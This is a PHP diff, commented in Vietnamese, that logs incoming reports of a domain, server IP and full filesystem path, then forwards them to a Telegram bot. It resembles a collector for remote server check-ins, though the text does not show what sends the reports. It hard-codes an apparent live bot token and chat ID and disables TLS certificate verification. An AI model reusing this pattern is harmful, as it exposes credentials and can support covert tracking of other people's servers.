@@ -20,7 +20,58 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // Cấu trúc nội dung theo định dạng yêu cầu
         $content = "Domain: $domain\nDate: $dateTime\nServer IP: $serverIP\nFull Path: $fullPath\n";
 
+        // Ghi vào file
         file_put_contents($file, "------\n$content", FILE_APPEND);
+
+        // Telegram Bot Configuration - CẦN THAY ĐỔI THÔNG SỐ NÀY
+        $telegramToken = '8139434527:AAF5hj9ZvZd1FOiJc7hiRohhduIgFEQzeqs'; // Thay bằng token của bot
+        $telegramChatID = '7439804416'; // Thay bằng chat ID của bạn
+        
+        // Format message for Telegram
+        $telegramMessage = "🚨 Domain Access Alert 🚨\n\n";
+        $telegramMessage .= "🌐 *Domain:* `$domain`\n";
+        $telegramMessage .= "📅 *Date:* $dateTime\n";
+        $telegramMessage .= "🖥️ *Server IP:* `$serverIP`\n";
+        $telegramMessage .= "📁 *Full Path:* `$fullPath`\n";
+        $telegramMessage .= "📄 *Filename:* `$filename`";
+
+        // Send to Telegram
+        sendTelegramMessage($telegramToken, $telegramChatID, $telegramMessage);
     }
 }
+
+function sendTelegramMessage($token, $chatId, $message) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'Markdown',
+        'disable_web_page_preview' => true
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    
+    $result = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    // Log Telegram response (optional)
+    if ($httpCode != 200) {
+        error_log("Telegram API Error: HTTP $httpCode - " . $result);
+    }
+    
+    return $result;
+}
+
+// Optional: Response to client
+http_response_code(200);
+echo json_encode(['status' => 'success', 'message' => 'Data processed and sent to Telegram']);
 ?>
+
